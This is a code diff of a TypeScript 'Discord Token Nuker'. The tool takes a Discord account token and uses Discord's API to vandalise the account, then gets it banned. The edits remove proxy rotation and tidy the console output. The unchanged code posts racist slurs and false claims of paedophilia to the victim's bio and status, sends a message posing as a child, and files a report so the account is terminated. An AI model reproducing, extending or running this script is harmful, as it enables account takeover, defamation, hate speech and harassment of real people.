@@ -1,10 +1,10 @@
 import fs from "node:fs";
-import readline from "node:readline/promises"
 import axios, {AxiosResponse, AxiosRequestConfig} from "axios";
 import ora, {Ora} from "ora";
 import chalk from "chalk";
 import util from "node:util";
 import yaml from "yaml";
+import readline from 'node:readline/promises'
 
 class BillingInfo {
      public "Type": string = "";
@@ -55,36 +55,20 @@ function clear_empty(data: any) {
 }
 
 function orainput(question: string) {
-     return ora(chalk.red(question.padStart(25, " ")));
+     return ora(chalk.red(question));
 }
 
 function pad(x: string) {
-     return chalk.red(x.padStart(25, ""));
+     return chalk.red(("").repeat(25) + x);
 }
  
 
-let proxies: string[][] = [];
 process.title = "Discord Token Nuker | Made by @nekovada on discord";
 
-async function proxy_init() {
-     await axios.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt", {responseType: "text"}).then((res: AxiosResponse<Response>) => {
-          proxies = res.data.text.toString().split("\n").map((v) => v.split(":"))
-     });
-}
-
 async function headerinit(auth: string, json?: any): Promise<AxiosRequestConfig> {
-     if (util.isDeepStrictEqual(proxies, {})) {
-          await proxy_init()
-     }
-     let proxy = proxies[Math.floor(Math.random() * proxies.length)]
      return {
           headers: {
                Authorization: auth
-          },
-          proxy: {
-               port: Number.parseInt(proxy[1]),
-               host: proxy[0],
-               protocol: "https"
           }
      }
 }
@@ -99,11 +83,11 @@ async function nuke(token: string): Promise<boolean> {
                let info = await axios.get("https://discord.com/api/users/@me", headers)
                notif.start();
                if (info.status != 200) {
-                    notif.fail(pad("Error! Token is invalid..."));
+                    notif.fail("Error! Token is invalid...");
                     return false;
                }
                ui = info;
-               notif.succeed(pad("Successfully validated token"));
+               notif.succeed("Successfully validated token");
           }
           let notif: Ora = orainput("Getting basic info...").start();
           let user: string = ui.data["Username"]
@@ -233,7 +217,7 @@ async function nuke(token: string): Promise<boolean> {
      let defd: Ora = orainput("Vandalizing account...");
      await axios.patch("https://discord.com/api/users/@me/settings", {"bio": "I really love kids, I cant hold this in anymore I am a MAP\nI also have membership in the ku klux klan and are a registered sex offender and hang niggers daily"}, headers);
      await axios.patch("https://discord.com/api/users/@me", {"custom-status": "Honestly, black people are subhuman, I think kids should be used as sex slaves too."}, headers);
-     defd.succeed(pad("Successfuly vandalized account..."));
+     defd.succeed("Successfuly vandalized account...");
      let banfd: Ora = orainput("Terming account...").start();
      await axios.post(`https://discord.com/api/users/@me/channels/${unlucky["id"]}/messages`, { "message": "I am 8 years old please don't tell anybody" }, headers).then(async () => {
           axios.post("https://discord.com/api/v6/report", {
@@ -308,15 +292,18 @@ async function main() {
                          ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░
                          
 `));
-     let input: readline.Interface = readline.createInterface(process.stdin, process.stdout);
+     let io: readline.Interface = readline.createInterface(process.stdin, process.stdout);
      while (true) {
-          process.stdout.write(pad("Enter your token >> "));
-          const token: string = await input.question('\0');
-          let time = Date.now();
-          if (await nuke(token)) {
-               console.log(pad(`Successfully nuked token in ${(Date.now() - time)/1000} seconds`));
-          } else {
-               console.log(pad("Invalid token!"))
+          const token = await io.question(pad("Enter your token >> "));
+          try {
+               let time = Date.now();
+               if (await nuke(token.toString())) {
+                    console.log(pad(`Successfully nuked token in ${(Date.now() - time)/1000} seconds`));
+                    continue;
+               }
+          } catch {
+               console.warn(pad("Invalid token!!"));
+               continue;
           }
      }
 }
